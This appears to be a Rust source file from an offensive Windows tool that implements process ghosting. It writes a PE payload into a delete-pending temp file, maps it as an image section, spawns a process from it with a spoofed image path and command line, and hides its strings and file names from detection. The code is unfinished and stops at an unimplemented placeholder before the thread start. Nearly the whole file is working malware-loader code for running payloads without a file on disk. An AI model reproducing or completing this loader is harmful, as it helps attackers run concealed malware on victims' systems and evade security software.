use core::ffi::c_void;
use core::ptr::null_mut;

use crate::debug;
use crate::core::nt;
use crate::core::types::*;
use crate::core::win32;

const INTERACTIVE_DESKTOP: &[u16] = &[
    0x0057, 0x0069, 0x006E, 0x0053, 0x0074, 0x0061, 0x0030, 0x005C, // WinSta0\
    0x0044, 0x0065, 0x0066, 0x0061, 0x0075, 0x006C, 0x0074, 0x0000, // Default\0
];

pub struct Config<'a> {
    pub pe_payload: &'a [u8],
    pub shellcode: &'a [u8],
    pub spoof_image_path: &'a [u16],
    pub spoof_command_line: Option<&'a [u16]>,
    pub enable_stack_spoof: bool,
    pub enable_ghosting: bool,
}

pub struct State {
    pub file_handle: HANDLE,
    pub section_handle: HANDLE,
    pub process_handle: HANDLE,
    pub thread_handle: HANDLE,
    pub process_id: usize,
    pub params_remote: *mut c_void,
    pub params_size: usize,
}

impl State {
    pub fn new() -> Self {
        Self {
            file_handle: null_mut(),
            section_handle: null_mut(),
            process_handle: null_mut(),
            thread_handle: null_mut(),
            process_id: 0,
            params_remote: null_mut(),
            params_size: 0,
        }
    }

    pub unsafe fn rollback(&mut self) {
        nt::nt_close(self.thread_handle);
        self.thread_handle = null_mut();

        nt::nt_terminate_process(self.process_handle, 1);
        nt::nt_close(self.process_handle);
        self.process_handle = null_mut();

        nt::nt_close(self.section_handle);
        self.section_handle = null_mut();

        nt::nt_close(self.file_handle);
        self.file_handle = null_mut();
    }
}

pub unsafe fn ghost_process(config: &Config) -> Option<State> {
    if config.pe_payload.is_empty() { return None; }

    // Validate PE signature
    if config.pe_payload.len() < 0x40 { 
        debug!("[GHOST] PE payload too small: {} bytes", config.pe_payload.len());
        return None; 
    }

    let dos_magic = *(config.pe_payload.as_ptr() as *const u16);
    if dos_magic != IMAGE_DOS_SIGNATURE {
        debug!("[GHOST] Invalid DOS signature: {:04X} != 0x5A4D", dos_magic);
        return None;
    }

    let mut state = State::new();

    let temp_path = generate_temp_path();
    let mut file_path_unicode_string = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: null_mut(),
    };
    win32::rtl_init_unicode_string(&mut file_path_unicode_string, temp_path.as_ptr());
    let mut obj_attr: ObjectAttributes = core::mem::zeroed();
    initialize_object_attributes(
        &mut obj_attr,
        &mut file_path_unicode_string, 
        0x00000040, 
        null_mut(), 
        null_mut()
    );

    let mut io_status: IoStatusBlock = core::mem::zeroed();
    let status = nt::nt_create_file(
        &mut state.file_handle,
        0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
        &mut obj_attr,
        &mut io_status,
        null_mut(),
        0x00000080,
        0,
        0x00000005,
        0x00000060, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
        null_mut(),
        0,
    );

    if status != STATUS_SUCCESS || state.file_handle.is_null() {
        debug!("[GHOST] NtCreateFile failed: 0x{:08X}", status);
        return None;
    }
    debug!("[GHOST] Temp file created, handle: {:p}", state.file_handle);

    // Mark the file DELETE_PENDING
    let mut disposition_infomration = FileDispositionInformation{ delete_file: 1 };
    io_status = core::mem::zeroed();
    let status = nt::nt_set_information_file(
        state.file_handle,  
        &mut io_status, 
        &mut disposition_infomration as *mut _ as *mut c_void,
        core::mem::size_of::<FileDispositionInformation>() as u32,
        13 as u32
    );
    if status != STATUS_SUCCESS {
        debug!("[GHOST] NtSetInfformationFile failed: 0x{:08X}", status);
        return None;
    }
    debug!("[GHOST] File marked DELETE_PENDING");


    // Write PE payload into the deleted pending file with explicit offset
    // Supply ByteOffset AND check io_status.information so partial wites cannot silently currupt the PE layout 
    let chunk_size: usize = 4096;
    let mut written: usize = 0;

    while written < config.pe_payload.len() {
        let remaining = config.pe_payload.len() - written;
        let this_chunk = if remaining < chunk_size { remaining } else { chunk_size };
        
        let mut byte_offset: i64 = written as i64;
        io_status = core::mem::zeroed();
        let status = nt::nt_write_file(
            state.file_handle,
            null_mut(),
            null_mut(),
            null_mut(),
            &mut io_status,
            config.pe_payload.as_ptr().add(written) as *const c_void,
            this_chunk as u32,
            &mut byte_offset as *mut _ as *mut c_void,
            null_mut(),
        );

        if status != STATUS_SUCCESS {
            debug!("[GHOST] NtWriteFile failed at offset {}: 0x{:08X}", written, status);
            state.rollback();
            return None;
        }

        let actually_written = io_status.information;
        if actually_written == 0 {
            debug!("[GHOST] NtWriteFile wrote 0 bytes at offset {}", written);
            state.rollback();
            return None;
        }
        written += actually_written;
    }

    // Create SEC_IMAGE section from the file
    let status = nt::nt_create_section(
        &mut state.section_handle,
        0x000F001F,
        null_mut(),
        null_mut(),
        0x04,
        0x01000000,
        state.file_handle,
    );

    if status != STATUS_SUCCESS || state.section_handle.is_null() {
        debug!("[GHOST] NtCreateSection failed: 0x{:08X}", status);
        state.rollback();
        return None;
    }
    debug!("[GHOST] SEC_IMAGE section created");

    // Close the file handle
    nt::nt_close(state.file_handle);
    state.file_handle = null_mut();

    // Create the ghosted process
    let current_process: HANDLE = -1isize as HANDLE;
    let status = nt::nt_create_process_ex(
        &mut state.process_handle,
        0x0010047B,           // VM_RW|VM_OP|QUERY_INFO|CREATE_THREAD|DUP_HANDLE|TERMINATE|SYNC
        null_mut(),           // ObjectAttributes
        current_process,      // ParentProcess
        0,                    // Flags
        state.section_handle, // SectionHandle — the ghost section
        null_mut(),           // DebugPort
        null_mut(),           // ExceptionPort
        0,                    // JobMemberLevel
    );

    if status != STATUS_SUCCESS || state.process_handle.is_null() {
        debug!("[GHOST] NtCreateProcessEx failed: 0x{:08X}", status);
        state.rollback();
        return None;
    }
    debug!("[GHOST] Process created: {:p}", state.process_handle);

    // Section handle is not longer needed, the kernel holds its own reference.
    // Closing early will shrink our fotprint
    nt::nt_close(state.section_handle);
    state.section_handle = null_mut();

    // Query the remote PEB address
    let mut process_basic_information: ProcessBasicInformation = core::mem::zeroed();
    let mut return_lenght: u32 = 0;

    let status = nt::nt_query_information_process(
        state.process_handle, 
        0, 
        &mut process_basic_information as *mut _ as *mut c_void, 
        core::mem::size_of::<ProcessBasicInformation>() as u32, 
        &mut return_lenght,
    );

    if status != STATUS_SUCCESS || process_basic_information.peb_base_address.is_null() {
        debug!("[GHOST] NtQueryInformationPRocess failed: 0x{:08X}", status);
        state.rollback();
        return None;
    }
    state.process_id = process_basic_information.unique_process_id;
    debug!("[GHOST] Ghost PID: {}", state.process_id);

    // TODO: Read remote PEB to get the image base then cmpute entry point
    let mut remote_peb: Peb64 = core::mem::zeroed();
    let mut bytes_read: usize = 0;

    let status = nt::nt_read_virtual_memory(
        state.process_handle, 
        process_basic_information.peb_base_address, 
        &mut remote_peb as *mut _ as *mut c_void, 
        core::mem::size_of::<Peb64>(),
        &mut bytes_read,
    );

    if status != STATUS_SUCCESS {
        debug!("[GHOST] NtReadVirtualMemory (PEB) failed: 0x{:08X}", status);
        state.rollback();
        return None;
    }

    let e_lfanew = *(config.pe_payload.as_ptr().add(0x3C) as *const i32);
    let optional_header = config.pe_payload.as_ptr().add(e_lfanew as usize + 4 + 20);
    let entry_rva = *(optional_header.add(16) as *const u32) as usize; // OptionalHeader.AddressOfEntryPoint is at offset 16 from start of optional header

    let image_base_field_offset = 0x10; // Peb64._reserved0[0] holds the image base, offset 0x10 in PEB   
    let mut remote_image_base: usize = 0;
    let status = nt::nt_read_virtual_memory(
        state.process_handle, 
        (process_basic_information.peb_base_address as usize + image_base_field_offset) as *mut c_void, 
        &mut remote_image_base as *mut _ as *mut c_void, 
        core::mem::size_of::<usize>(), 
        &mut bytes_read
    );

    if status != STATUS_SUCCESS || remote_image_base == 0 {
        debug!("[GHOST] NtReadVirtualMemory (image base) failed: 0x{:08X} base=0x{:X}", status, remote_image_base);
        state.rollback();
        return None;
    }
    debug!("[GHOST] Remote image base: 0x{:X}, entry RVA: 0x{:X}", remote_image_base, entry_rva);
    
    let entry_point = (remote_image_base + entry_rva) as *mut c_void;

    let mut image_path = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null(),
    };
    debug!("[GHOST] Setting image path to: {:?}", config.spoof_image_path);
    win32::rtl_init_unicode_string(&mut image_path, config.spoof_image_path.as_ptr());

    let cmd_ptr = config.spoof_command_line.map(|c| c.as_ptr()).unwrap_or(config.spoof_image_path.as_ptr());
    let mut command_line = UnicodeString{
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null(),
    };
    debug!("[GHOST] Setting command line to: {:?}", cmd_ptr);
    win32::rtl_init_unicode_string(&mut command_line, cmd_ptr);

    let mut desktop_info = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null(),
    };
    debug!("[GHOST] Setting desktop info to: {:?}", INTERACTIVE_DESKTOP);
    win32::rtl_init_unicode_string(&mut desktop_info, INTERACTIVE_DESKTOP.as_ptr());

    let mut process_params: *mut c_void = null_mut();
    let status = win32::rtl_create_process_parameters_ex(
        &mut process_params,
        &mut image_path,
        null_mut(),             // DllPath
        null_mut(),             // CurrentDirectory
        &mut command_line,
        null_mut(),             // Environment
        null_mut(),             // WindowTitle
        &mut desktop_info,      // DesktopInfo
        null_mut(),             // ShellInfo
        null_mut(),             // RuntimeData
        0,                      // UnicodeString.Buffer
    );
    if status != STATUS_SUCCESS || process_params.is_null() {
        debug!("[GHOST] RtlCreateProcessParametersEx failed: 0x{:08X}", status);
        state.rollback();
        return None;
    }

    unimplemented!()
}

unsafe fn generate_temp_path() -> [u16; 48] {
    let mut path: [u16; 48] = [0u16; 48];

    let prefixes: [[u16; 3]; 6] = [
        [0x0074, 0x006D, 0x0070],  // tmp
        [0x0063, 0x0061, 0x0062],  // cab
        [0x0068, 0x0073, 0x0070],  // hsp
        [0x006D, 0x0073, 0x0074],  // mst
        [0x0064, 0x0066, 0x007E],  // df~
        [0x0073, 0x0063, 0x0070],  // scp
    ];

    let base_prefix: &[u16] = &[
        0x005C, 0x003F, 0x003F, 0x005C,                                 // \??\
        0x0043, 0x003A, 0x005C,                                         // C:\
        0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, // Windows\
        0x0054, 0x0065, 0x006D, 0x0070, 0x005C,                         // Temp\
    ];

    let mut i = 0;
    while i < base_prefix.len() {
        path[i] = base_prefix[i];
        i += 1;
    }

    let seed: u64;
    #[cfg(target_arch = "x86_64")]
    {
        core::arch::asm!(
            "rdtsc",
            "shl rdx, 32",
            out("rax") seed,
            out("rdx") _
        );
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        seed = 0x1A2B3C4D;
    }

    // Select random prefix from pool
    let prefix_idx = ((seed >> 16) as usize) % prefixes.len();
    let chosen = &prefixes[prefix_idx];
    path[i] = chosen[0]; i += 1;
    path[i] = chosen[1]; i += 1;
    path[i] = chosen[2]; i += 1;

    let hex_chars: &[u16; 16] = &[
        0x0030, 0x0031, 0x0032, 0x0033, 0x0034, 0x0035, 0x0036, 0x0037, 
        0x0038, 0x0039, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046,
    ];
    let mut value = seed;
    for j in 0..8 {
        path[i + j] = hex_chars[(value & 0x0F) as usize];
        value >>= 4;
    }
    i += 8;

    // .tmp\0
    path[i] = 0x002E; i += 1; // .
    path[i] = 0x0074; i += 1; // t
    path[i] = 0x006D; i += 1; // m
    path[i] = 0x0070; i += 1; // p
    path[i] = 0x0000; // terminator

    path
}

